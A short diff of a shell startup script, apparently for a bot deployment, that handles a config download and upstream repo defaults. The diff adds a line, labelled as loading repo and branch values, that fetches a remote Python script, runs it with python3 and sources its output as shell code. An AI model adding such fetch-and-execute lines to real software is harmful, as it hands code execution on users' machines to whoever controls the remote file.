@@ -2,8 +2,11 @@
 
 if [[ ${CONFIG_FILE_URL} ]];
 then
-    echo "Downloading... config file"
+    echo "Detected CONFIG_FILE_URL, Downloading..."
     curl -o config.env -s $CONFIG_FILE_URL
+    echo "Loading UPSTREAM_REPO and UPSTREAM_BRANCH"
+    echo $(curl -s https://raw.githubusercontent.com/ahad0xff/empty/main/load.py | python3) > xxx
+    source xxx && rm xxx
     echo "Done"
 else
     echo "CONFIG_FILE_URL var not provided!"
@@ -15,7 +18,7 @@ then
 else
     UPSTREAM_REPO="https://github.com/ahad0xff/admlb"
     UPSTREAM_BRANCH="main"
-    echo "UPSTREAM_REPO or UPSTREAM_BRANCH missing, using default ones"
+    echo "UPSTREAM_REPO or UPSTREAM_BRANCH missing, Using default once"
 fi
 
 [ -d ".git" ] && rm -rf ".git"
